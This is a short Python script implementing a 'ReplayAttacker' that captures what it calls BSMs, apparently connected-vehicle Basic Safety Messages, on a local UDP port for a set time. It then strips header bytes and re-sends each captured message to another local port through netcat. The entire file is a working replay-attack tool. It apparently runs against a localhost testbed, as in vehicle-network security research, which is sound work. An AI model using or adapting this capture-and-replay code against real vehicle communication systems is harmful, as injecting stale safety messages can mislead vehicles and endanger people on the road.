import subprocess
import time
import socket


class ReplayAttacker:

    def __init__(self, collect_time):
        self.storedBSMs = []
        self.collection_period = collect_time

    def run(self):
        self.collect()
        self.replay()

    def collect(self):
        print("Starting REPLAY ATTACK...")
        print("Configured to collect messages for", str(self.collection_period), "seconds...")
        print("Listening on localhost:4444 for BSMs...")

        start = time.time()
        timer = 0

        listener = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        listener.bind(('127.0.0.1', 4444))

        while True:
            if timer > self.collection_period:
                listener.close()
                break
            wsm = listener.recv(1024)
            print("Received message!")
            self.store_message(wsm.hex()[32:])
            end = time.time()
            timer = round(end - start)
        print("-"*80)
        input("Collection complete... Press Enter to begin replaying messages")
        print()

    def store_message(self, message):
        # print(message)
        self.storedBSMs.append(message)

    def replay(self):
        print("Replaying BSMs!")
        for bsm in self.storedBSMs:
            
            bsm = bsm[82:]
            
            bsm = "\\x" + "\\x".join(bsm[i:i + 2] for i in range(0, len(bsm), 2))

            print("Replaying BSM")
            
            loader = subprocess.Popen(("echo", "-n", "-e", bsm), stdout=subprocess.PIPE)
            sender = subprocess.check_output(("nc", "-w0", "-u", "localhost", "52001"), stdin=loader.stdout)
            
            time.sleep(0.1)
